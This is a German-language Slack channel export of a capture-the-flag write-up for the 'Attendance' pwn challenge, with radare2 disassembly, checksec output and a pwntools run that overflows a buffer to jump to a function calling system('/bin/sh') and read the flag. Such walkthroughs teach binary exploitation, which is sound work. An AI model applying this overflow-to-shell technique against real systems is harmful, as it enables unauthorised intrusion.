@@ -1,0 +1,710 @@
+Attendance (50pts)
+6 days, 21 hours, 53 minutes, 49 seconds remaining
+hmmm, I feel not all students are attending my lesson today, someone missing?
+
+remote: 89.38.210.128 31337
+
+Author: 0xcpu
+
+attendance 8541b72d5dcdb90a4ba56bff612c2da4
+
+
+pwntools
+Message List
+2018_timictf_pwn_atta
+You created this channel today. This is the very beginning of the 2018_timictf_pwn_atta channel.
+d0n [2:30 PM]
+joined #2018_timictf_pwn_atta along with 2 others.
+d0n [2:32 PM]
+hab mal ueber mittag die zwei deppen-flags geholt und dann die erste echte aufgabe geloest. da mir das disassembly vom objdump zu sehr nichts-sagend ist, habe ich radare2 drauf angesetzt:
+d0n [2:33 PM]
+added this Plain Text snippet: Untitled
+
+user@19db41fe1d64 /data/pwnable/attendance $ radare2 attendance
+
+d0n [2:34 PM]
+added this Plain Text snippet: Untitled
+
+kot analysieren:
+
+[0x08048560]> aaaa
+
+[x] Analyze all flags starting with sym. and entry0 (aa)
+
+[x] Analyze len bytes of instructions for references (aar)
+
+d0n [2:35 PM]
+added this Plain Text snippet: Untitled
+
+zur funktion main springen:
+
+[0x08048560]> s sym.main
+
+d0n [2:36 PM]
+added this Plain Text snippet: Untitled
+
+kot von main disassemblen:
+
+[0x08048690]> pdf
+
+/ (fcn) main 581
+
+|  main ();
+
+|      ; var int local_68h @ ebp-0x68
+
+|      ; var int local_64h @ ebp-0x64
+
+|      ; var int local_60h @ ebp-0x60
+
+|      ; var int local_5ch @ ebp-0x5c
+
+|      ; var int local_58h @ ebp-0x58
+
+|      ; var int local_54h @ ebp-0x54
+
+|      ; var int local_50h @ ebp-0x50
+
+|      ; var int local_4ch @ ebp-0x4c
+
+|      ; var int local_48h @ ebp-0x48
+
+|      ; var int local_44h @ ebp-0x44
+
+|      ; var int local_40h @ ebp-0x40
+
+|      ; var int local_3ch @ ebp-0x3c
+
+|      ; var int local_38h @ ebp-0x38
+
+|      ; var int local_34h @ ebp-0x34
+
+|      ; var int local_30h @ ebp-0x30
+
+|      ; var int local_2ch @ ebp-0x2c
+
+|      ; var int local_28h @ ebp-0x28
+
+|      ; var int local_24h @ ebp-0x24
+
+|      ; var int local_20h @ ebp-0x20
+
+|      ; var int local_1ch @ ebp-0x1c
+
+|      ; var int local_17h @ ebp-0x17
+
+|      ; var int local_10h @ ebp-0x10
+
+|      ; var int local_4h @ esp+0x4
+
+|      ; var int local_8h @ esp+0x8
+
+|      ; var int local_ch @ esp+0xc
+
+|      ; UNKNOWN XREF from 0x08048699 (main)
+
+|      ; DATA XREF from 0x08048577 (entry0)
+
+|      0x08048690   55       push ebp
+
+|      0x08048691   89e5      mov ebp, esp
+
+|      0x08048693   53       push ebx
+
+|      0x08048694   57       push edi
+
+|      0x08048695   56       push esi
+
+|      0x08048696   83ec6c     sub esp, 0x6c        ; 'l'
+
+|      0x08048699   e800000000   call 0x804869e
+
+|      ; CALL XREF from 0x08048699 (main)
+
+|      0x0804869e   58       pop eax
+
+|      0x0804869f   81c062190000  add eax, 0x1962
+
+|      0x080486a5   b93c000000   mov ecx, 0x3c        ; '<' ; 60
+
+|      0x080486aa   c745f0000000. mov dword [local_10h], 0
+
+|      0x080486b1   c704243c0000. mov dword [esp], 0x3c    ; '<' ; [0x3c:4]=-1 ; 60
+
+|      0x080486b8   89c3      mov ebx, eax
+
+|      0x080486ba   8945e0     mov dword [local_20h], eax
+
+|      0x080486bd   894ddc     mov dword [local_24h], ecx
+
+|      0x080486c0   e80bfeffff   call sym.imp.alarm
+
+|      0x080486c5   31c9      xor ecx, ecx
+
+|      0x080486c7   bb02000000   mov ebx, 2
+
+|      0x080486cc   8b55e0     mov edx, dword [local_20h]
+
+|      0x080486cf   8bb2f8ffffff  mov esi, dword [edx - 8]
+
+|      0x080486d5   8b36      mov esi, dword [esi]
+
+|      0x080486d7   893424     mov dword [esp], esi    ; int mode
+
+|      0x080486da   c74424040000. mov dword [local_4h], 0   ; size_t size
+
+|      0x080486e2   c74424080200. mov dword [local_8h], 2
+
+|      0x080486ea   c744240c0000. mov dword [local_ch], 0
+
+|      0x080486f2   895dd8     mov dword [local_28h], ebx
+
+|      0x080486f5   89d3      mov ebx, edx
+
+|      0x080486f7   8945d4     mov dword [local_2ch], eax
+
+|      0x080486fa   894dd0     mov dword [local_30h], ecx
+
+|      0x080486fd   e82efeffff   call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
+
+|      0x08048702   31c9      xor ecx, ecx
+
+|      0x08048704   ba02000000   mov edx, 2
+
+|      0x08048709   8b75e0     mov esi, dword [local_20h]
+
+|      0x0804870c   8b9efcffffff  mov ebx, dword [esi - 4]
+
+|      0x08048712   8b1b      mov ebx, dword [ebx]
+
+|      0x08048714   891c24     mov dword [esp], ebx    ; int mode
+
+|      0x08048717   c74424040000. mov dword [local_4h], 0   ; size_t size
+
+|      0x0804871f   c74424080200. mov dword [local_8h], 2
+
+|      0x08048727   c744240c0000. mov dword [local_ch], 0
+
+|      0x0804872f   89f3      mov ebx, esi
+
+|      0x08048731   8945cc     mov dword [local_34h], eax
+
+|      0x08048734   894dc8     mov dword [local_38h], ecx
+
+|      0x08048737   8955c4     mov dword [local_3ch], edx
+
+|      0x0804873a   e8f1fdffff   call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
+
+|      0x0804873f   8b4de0     mov ecx, dword [local_20h]
+
+|      0x08048742   8d9128ebffff  lea edx, dword [ecx - 0x14d8]
+
+|      0x08048748   891424     mov dword [esp], edx    ; const char * format
+
+|      0x0804874b   89cb      mov ebx, ecx
+
+|      0x0804874d   8945c0     mov dword [local_40h], eax
+
+|      0x08048750   e84bfdffff   call sym.imp.printf     ; int printf(const char *format)
+
+|      0x08048755   b907000000   mov ecx, 7
+
+|      0x0804875a   8b55e0     mov edx, dword [local_20h]
+
+|      0x0804875d   8bb2f8ffffff  mov esi, dword [edx - 8]
+
+|      0x08048763   8d5de9     lea ebx, dword [local_17h]
+
+|      0x08048766   31ff      xor edi, edi
+
+|      0x08048768   89da      mov edx, ebx
+
+|      0x0804876a   891424     mov dword [esp], edx    ; int c
+
+|      0x0804876d   c74424040000. mov dword [local_4h], 0   ; size_t n
+
+|      0x08048775   c74424080700. mov dword [local_8h], 7
+
+|      0x0804877d   8b55e0     mov edx, dword [local_20h]
+
+|      0x08048780   895dbc     mov dword [local_44h], ebx
+
+|      0x08048783   89d3      mov ebx, edx
+
+|      0x08048785   8945b8     mov dword [local_48h], eax
+
+|      0x08048788   894db4     mov dword [local_4ch], ecx
+
+|      0x0804878b   897db0     mov dword [local_50h], edi
+
+|      0x0804878e   8975ac     mov dword [local_54h], esi
+
+|      0x08048791   e8aafdffff   call sym.imp.memset     ; void *memset(void *s, int c, size_t n)
+
+|      0x08048796   8b45ac     mov eax, dword [local_54h]
+
+|      0x08048799   8b08      mov ecx, dword [eax]
+
+|      0x0804879b   8b55bc     mov edx, dword [local_44h]
+
+|      0x0804879e   891424     mov dword [esp], edx    ; char *s
+
+|      0x080487a1   c74424040700. mov dword [local_4h], 7
+
+|      0x080487a9   894c2408    mov dword [local_8h], ecx
+
+|      0x080487ad   8b5de0     mov ebx, dword [local_20h]
+
+|      0x080487b0   e80bfdffff   call sym.imp.fgets     ; char *fgets(char *s, int size, FILE *stream)
+
+|      0x080487b5   8b4de0     mov ecx, dword [local_20h]
+
+|      0x080487b8   8d91ceebffff  lea edx, dword [ecx - 0x1432]
+
+|      0x080487be   8d75e9     lea esi, dword [local_17h]
+
+|      0x080487c1   893424     mov dword [esp], esi    ; const char * s2
+
+|      0x080487c4   89542404    mov dword [local_4h], edx
+
+|      0x080487c8   89cb      mov ebx, ecx
+
+|      0x080487ca   8945a8     mov dword [local_58h], eax
+
+|      0x080487cd   e8defcffff   call sym.imp.strcspn    ; size_t strcspn(const char *s1, const char *s2)
+
+|      0x080487d2   31c9      xor ecx, ecx
+
+|      0x080487d4   ba0a000000   mov edx, 0xa
+
+|      0x080487d9   8d75e9     lea esi, dword [local_17h]
+
+|      0x080487dc   c64405e900   mov byte [ebp + eax - 0x17], 0
+
+|      0x080487e1   893424     mov dword [esp], esi    ; int base
+
+|      0x080487e4   c74424040000. mov dword [local_4h], 0
+
+|      0x080487ec   c74424080a00. mov dword [local_8h], 0xa
+
+|      0x080487f4   8b5de0     mov ebx, dword [local_20h]
+
+|      0x080487f7   8955a4     mov dword [local_5ch], edx
+
+|      0x080487fa   894da0     mov dword [local_60h], ecx
+
+|      0x080487fd   e80efdffff   call sym.imp.strtoul    ; long strtoul(const char *str, char**endptr, int base)
+
+|      0x08048802   8945e4     mov dword [local_1ch], eax
+
+|      0x08048805   837de401    cmp dword [local_1ch], 1  ; [0x1:4]=-1 ; 1
+
+|    ,=< 0x08048809   0f850d000000  jne 0x804881c
+
+|    |  0x0804880f   8b5de0     mov ebx, dword [local_20h]
+
+|    |  0x08048812   e8c9000000   call sym.student_1
+
+|   ,==< 0x08048817   e9a5000000   jmp 0x80488c1
+
+|   ||  ; JMP XREF from 0x08048809 (main)
+
+|   |`-> 0x0804881c   837de402    cmp dword [local_1ch], 2  ; [0x2:4]=-1 ; 2
+
+|   |,=< 0x08048820   0f850d000000  jne 0x8048833
+
+|   ||  0x08048826   8b5de0     mov ebx, dword [local_20h]
+
+|   ||  0x08048829   e8e2000000   call sym.student_2
+
+|   ,===< 0x0804882e   e989000000   jmp 0x80488bc
+
+|   |||  ; JMP XREF from 0x08048820 (main)
+
+|   ||`-> 0x08048833   837de403    cmp dword [local_1ch], 3  ; [0x3:4]=-1 ; 3
+
+|   ||,=< 0x08048837   0f850d000000  jne 0x804884a
+
+|   |||  0x0804883d   8b5de0     mov ebx, dword [local_20h]
+
+|   |||  0x08048840   e8fb000000   call sym.student_3
+
+|  ,====< 0x08048845   e96d000000   jmp 0x80488b7
+
+|  ||||  ; JMP XREF from 0x08048837 (main)
+
+|  |||`-> 0x0804884a   837de404    cmp dword [local_1ch], 4  ; eflags ; [0x4:4]=-1
+
+|  |||,=< 0x0804884e   0f850d000000  jne 0x8048861
+
+|  ||||  0x08048854   8b5de0     mov ebx, dword [local_20h]
+
+|  ||||  0x08048857   e814010000   call sym.student_4
+
+|  ,=====< 0x0804885c   e951000000   jmp 0x80488b2
+
+|  |||||  ; JMP XREF from 0x0804884e (main)
+
+|  ||||`-> 0x08048861   837de405    cmp dword [local_1ch], 5  ; aeim.fd ; [0x5:4]=-1
+
+|  ||||,=< 0x08048865   0f850d000000  jne 0x8048878
+
+|  |||||  0x0804886b   8b5de0     mov ebx, dword [local_20h]
+
+|  |||||  0x0804886e   e82d010000   call sym.student_5
+
+| ,======< 0x08048873   e935000000   jmp 0x80488ad
+
+| ||||||  ; JMP XREF from 0x08048865 (main)
+
+| |||||`-> 0x08048878   817de4697a00. cmp dword [local_1ch], 0x7a69 ; [0x7a69:4]=-1
+
+| |||||,=< 0x0804887f   0f850d000000  jne 0x8048892
+
+| ||||||  0x08048885   8b5de0     mov ebx, dword [local_20h]
+
+| ||||||  0x08048888   e843010000   call sym.principal
+
+| ,=======< 0x0804888d   e916000000   jmp 0x80488a8
+
+| |||||||  ; JMP XREF from 0x0804887f (main)
+
+| ||||||`-> 0x08048892   8b45e0     mov eax, dword [local_20h]
+
+| ||||||  0x08048895   8d882febffff  lea ecx, dword [eax - 0x14d1]
+
+| ||||||  0x0804889b   890c24     mov dword [esp], ecx
+
+| ||||||  0x0804889e   89c3      mov ebx, eax
+
+| ||||||  0x080488a0   e83bfcffff   call sym.imp.puts      ; int puts(const char *s)
+
+| ||||||  0x080488a5   89459c     mov dword [local_64h], eax
+
+| ||||||  ; JMP XREF from 0x0804888d (main)
+
+| `-----,=< 0x080488a8   e900000000   jmp 0x80488ad
+
+| ||||||  ; JMP XREF from 0x080488a8 (main)
+
+| ||||||  ; JMP XREF from 0x08048873 (main)
+
+| ,`----`-> 0x080488ad   e900000000   jmp 0x80488b2
+
+| | ||||  ; JMP XREF from 0x080488ad (main)
+
+| | ||||  ; JMP XREF from 0x0804885c (main)
+
+| `-`---,=< 0x080488b2   e900000000   jmp 0x80488b7
+
+|  ||||  ; JMP XREF from 0x080488b2 (main)
+
+|  ||||  ; JMP XREF from 0x08048845 (main)
+
+|  ,`--`-> 0x080488b7   e900000000   jmp 0x80488bc
+
+|  | ||  ; JMP XREF from 0x080488b7 (main)
+
+|  | ||  ; JMP XREF from 0x0804882e (main)
+
+|  `-`-,=< 0x080488bc   e900000000   jmp 0x80488c1
+
+|   ||  ; JMP XREF from 0x080488bc (main)
+
+|   ||  ; JMP XREF from 0x08048817 (main)
+
+|   ``-> 0x080488c1   31c0      xor eax, eax
+
+|      0x080488c3   c70424000000. mov dword [esp], 0     ; int status
+
+|      0x080488ca   8b5de0     mov ebx, dword [local_20h]
+
+|      0x080488cd   894598     mov dword [local_68h], eax
+
+\      0x080488d0   e82bfcffff   call sym.imp.exit      ; void exit(int status)
+
+[0x08048690]>
+
+d0n [2:37 PM]
+added this Plain Text snippet: Untitled
+
+den call graph von main bekommt man, wenn man VV eingibt:
+
+[0x08048690]> VV
+
+d0n [2:41 PM]
+dort sieht man dann, dass da sowas wie ein if-then-else kommt:if         eingabe==1 then do_shit_and_exit()
+else if eingabe==2 then do_shit_and_exit()
+else if eingabe==3 then do_shit_and_exit()
+else if eingabe==4 then do_shit_and_exit()
+else if eingabe==5 then do_shit_and_exit()
+else if eingabe==0x7A69 (=>31337) then call principal()
+d0n [2:42 PM]
+added this Plain Text snippet: Untitled
+
+das sieht dann in assembler folgendermassen aus:
+
+|      0x08048805   837de401    cmp dword [local_1ch], 1  ; [0x1:4]=-1 ; 1
+
+|    ,=< 0x08048809   0f850d000000  jne 0x804881c
+
+|    |  0x0804880f   8b5de0     mov ebx, dword [local_20h]
+
+|    |  0x08048812   e8c9000000   call sym.student_1
+
+|   ,==< 0x08048817   e9a5000000   jmp 0x80488c1
+
+|   ||  ; JMP XREF from 0x08048809 (main)
+
+|   |`-> 0x0804881c   837de402    cmp dword [local_1ch], 2  ; [0x2:4]=-1 ; 2
+
+|   |,=< 0x08048820   0f850d000000  jne 0x8048833
+
+|   ||  0x08048826   8b5de0     mov ebx, dword [local_20h]
+
+|   ||  0x08048829   e8e2000000   call sym.student_2
+
+|   ,===< 0x0804882e   e989000000   jmp 0x80488bc
+
+|   |||  ; JMP XREF from 0x08048820 (main)
+
+|   ||`-> 0x08048833   837de403    cmp dword [local_1ch], 3  ; [0x3:4]=-1 ; 3
+
+|   ||,=< 0x08048837   0f850d000000  jne 0x804884a
+
+|   |||  0x0804883d   8b5de0     mov ebx, dword [local_20h]
+
+|   |||  0x08048840   e8fb000000   call sym.student_3
+
+|  ,====< 0x08048845   e96d000000   jmp 0x80488b7
+
+|  ||||  ; JMP XREF from 0x08048837 (main)
+
+|  |||`-> 0x0804884a   837de404    cmp dword [local_1ch], 4  ; eflags ; [0x4:4]=-1
+
+|  |||,=< 0x0804884e   0f850d000000  jne 0x8048861
+
+|  ||||  0x08048854   8b5de0     mov ebx, dword [local_20h]
+
+|  ||||  0x08048857   e814010000   call sym.student_4
+
+|  ,=====< 0x0804885c   e951000000   jmp 0x80488b2
+
+|  |||||  ; JMP XREF from 0x0804884e (main)
+
+|  ||||`-> 0x08048861   837de405    cmp dword [local_1ch], 5  ; aeim.fd ; [0x5:4]=-1
+
+|  ||||,=< 0x08048865   0f850d000000  jne 0x8048878
+
+|  |||||  0x0804886b   8b5de0     mov ebx, dword [local_20h]
+
+|  |||||  0x0804886e   e82d010000   call sym.student_5
+
+| ,======< 0x08048873   e935000000   jmp 0x80488ad
+
+| ||||||  ; JMP XREF from 0x08048865 (main)
+
+| |||||`-> 0x08048878   817de4697a00. cmp dword [local_1ch], 0x7a69 ; [0x7a69:4]=-1
+
+| |||||,=< 0x0804887f   0f850d000000  jne 0x8048892
+
+| ||||||  0x08048885   8b5de0     mov ebx, dword [local_20h]
+
+| ||||||  0x08048888   e843010000   call sym.principal
+
+d0n [2:43 PM]
+added this Plain Text snippet: Untitled
+
+also habe ich das programm mal laufen lassen mit ein paar eingaben:
+
+user@19db41fe1d64 /data/pwnable/attendance $ ./attendance
+
+Call> 1
+
+Student 1 - present
+
+d0n [2:44 PM]
+added this Plain Text snippet: Untitled
+
+nun habe ich meinen linken zeigefinger genommen und ein paar sekunden auf die A taste gedrueckt um zu sehen, ob ich die eingabe zum ueberlauf bringen kann:
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Principal got your message AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Segmentation fault
+
+d0n [2:47 PM]
+super sache. das klappt. da das binary not-stripped ist, habe ich mir die symbole mal ausgeben lassen um nach einer funktion zu suchen, deren adresse ich als return adresse auf den stack schreiben koennte, um damit irgendwas nuetzliches anstellen zu koennen:user@19db41fe1d64 /data/pwnable/attendance $ nm attendance
+        U alarm@@GLIBC_2.0
+08048660 T bring_students_to_school
+0804a040 B __bss_start
+[...]
+d0n [2:49 PM]
+added this Plain Text snippet: Untitled
+
+die gleich oben erscheinende funktion bring_student_to_school sah interessant aus. also habe ich mir das disassembly geben lassen:
+
+08048660 <bring_students_to_school>:
+
+ 8048660:  55           push  %ebp
+
+ 8048661:  89 e5          mov  %esp,%ebp
+
+ 8048663:  53           push  %ebx
+
+ 8048664:  83 ec 14        sub  $0x14,%esp
+
+ 8048667:  e8 00 00 00 00     call  804866c <bring_students_to_school+0xc>
+
+ 804866c:  58           pop  %eax
+
+ 804866d:  81 c0 94 19 00 00    add  $0x1994,%eax
+
+ 8048673:  8d 88 20 eb ff ff    lea  -0x14e0(%eax),%ecx
+
+ 8048679:  89 0c 24        mov  %ecx,(%esp)
+
+ 804867c:  89 c3          mov  %eax,%ebx
+
+ 804867e:  e8 6d fe ff ff     call  80484f0 <system@plt>
+
+ 8048683:  89 45 f8        mov  %eax,-0x8(%ebp)
+
+ 8048686:  83 c4 14        add  $0x14,%esp
+
+ 8048689:  5b           pop  %ebx
+
+ 804868a:  5d           pop  %ebp
+
+ 804868b:  c3           ret
+
+ 804868c:  0f 1f 40 00       nopl  0x0(%eax)
+
+d0n [2:49 PM]
+added this Plain Text snippet: Untitled
+
+und wie man sieht, ruft die funktion intern ```system()``` auf:
+
+ 804867e:  e8 6d fe ff ff     call  80484f0 <system@plt>
+
+d0n [2:58 PM]
+uploaded and commented on this image: image.png
+image.png
+in radare2 kann sich das disassembly sogar deutlich verstaendlicher ausgeben lassen, weil farbig
+d0n [3:01 PM]
+uploaded and commented on this image: image.png
+image.png
+der binary-ninja macht das ganze sogar noch anschaulicher, indem er die adressen der strings durch die jeweiligen zeichenketten ersetzt. dann sehen wir, dass die funktion
+
+```bring_students_to_school()```
+
+ein ```system("/bin/sh")```ruft.
+d0n [3:06 PM]
+fazit: das binary
+
+```attendance```
+
+ist 32bit, hat kein stack protection (canary) und ist nicht position independent (PIE):
+
+```$ checksec attendance
+[*] '/data/pwnable/attendance/attendance'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)```
+
+und die unterfunktion
+
+```bring_students_to_school()```
+
+ruft intern ein
+
+```system("/bin/sh") auf und hat die adresse ```0x08048660```
+
+.
+d0n [3:08 PM]
+added this Plain Text snippet: Untitled
+
+diese erkenntnisse habe ich mit pwntools verheiratet:
+
+#!/usr/bin/python
+
+d0n [3:10 PM]
+added this Plain Text snippet: Untitled
+
+laesst man das pwntools script laufen, bekommt man.... EINE SHELL :-D
+
+user@f7f3d2ba032b /data/pwnable/attendance $ python exploit.py
+
+[+] Opening connection to 89.38.210.128 on port 31337: Done
+
+Call>
+
+[*] Sending student ID 31337
+
+[*] Sending principal message (payload): AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCC`\x86\x0
+
+[*] Switching to interactive mode
+
+Leave a message for the principal, please:
+
+Principal got your message AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCC`\x86\x0
+
+$
+
+d0n [3:11 PM]
+added this Plain Text snippet: Untitled
+
+und innerhalb der shell habe ich dann etwas rum gesucht und bin schlussendlich hier fuendig geworden:
+
+$ cd home
+
+$ cd attendance
+
+$ cat flag
+
+d0n [3:13 PM]
+added this Plain Text snippet: Untitled
+
+wenn man in dem pwntool script die zeile
+
+io.interactive()
+
+mit den folgenden zeilen austauscht, muss man nicht mal mehr was von hand tippen und hat ein astreines exploit :-D
+
+io.sendline( "cd /home/attendance" )
+
+io.sendline( "cat flag" )
+
+print( io.recv() )
+
+print( io.recv() )
+
+user@f7f3d2ba032b /data/pwnable/attendance $ python exploit.py
+
+[+] Opening connection to 89.38.210.128 on port 31337: Done
+
+Call>
+
+[*] Sending student ID 31337
+
+[*] Sending principal message (payload): AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCC`\x86\x0
+
+Leave a message for the principal, please:
+
+Principal got your message AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCC`\x86\x0
+
+timctf{l1ttl3_th1ngs_m4k3_b1g_th1ngs_h4pp3n}
+
+[*] Closed connection to 89.38.210.128 port 31337
+
+d0n [3:15 PM]
+also 50 points fand ich nun etwas wenig fuer diese uebung und die tatsache, dass es sich um eine highschool ctf handelt. aber offenbar haben die jungen leute heute mehr drauf :wink:
+Message Input
+
+
+Message #2018_timictf_pwn_atta
+*bold* _italics_ ~strike~ `code` ```preformatted``` >quote
+About #2018_timictf_pwn_atta
